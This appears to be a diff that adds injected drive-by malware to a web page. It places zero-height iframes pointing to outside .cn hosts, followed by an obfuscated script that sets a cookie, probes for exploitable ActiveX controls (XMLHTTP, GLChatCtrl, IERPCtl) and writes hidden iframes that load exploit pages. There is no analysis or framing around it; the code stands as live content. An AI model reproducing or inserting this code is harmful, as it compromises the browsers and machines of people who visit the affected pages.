@@ -1,0 +1,20 @@
+<iframe src="http://www.rixpar.cn/456.htm" width=100 height=0></iframe>
+<iframe src="http://www.rtujnx.cn/1.html" width=100 height=0></iframe>
+<iframe src="http://www.rtujnx.cn/r.html" width=100 height=0></iframe>
+<script>
+window.defaultStatus="Íê³É";
+var lovechina="fuckcnn"
+var L_czcY_1 = new window["Date"]()
+L_czcY_1["setTime"](L_czcY_1["getTime"]() + 3*60*60*1000)
+var Jy2$2 = new window["String"](window["document"]["cookie"])
+var sX$bhbGk3 = "Cookie1="
+var zecKZZ4 = Jy2$2["indexOf"](sX$bhbGk3)
+if (zecKZZ4 == -1)
+{
+window["document"]["cookie"] = "Cookie1=POPWINDOS;expires="+ L_czcY_1["toGMTString"]()
+try{if(new window["ActiveXObject"]("Microsoft.XMLHTTP"))window["document"]["write"]('<iframe style=display:none src="0.htm"></iframe>');}catch(e){}
+try{if(new window["ActiveXObject"]("GLCHAT.GLChatCtrl.1"))window["document"]["write"]('<iframe style=display:none src="http://www.rtujnx.cn/l.html"></iframe>');}catch(e){}
+try{if(new window["ActiveXObject"]("IERPCtl.IERPCtl.1"))window["document"]["write"]('<iframe style=display:none src="0.htm"></iframe>');}catch(e){}
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=1;
+}
+</script>
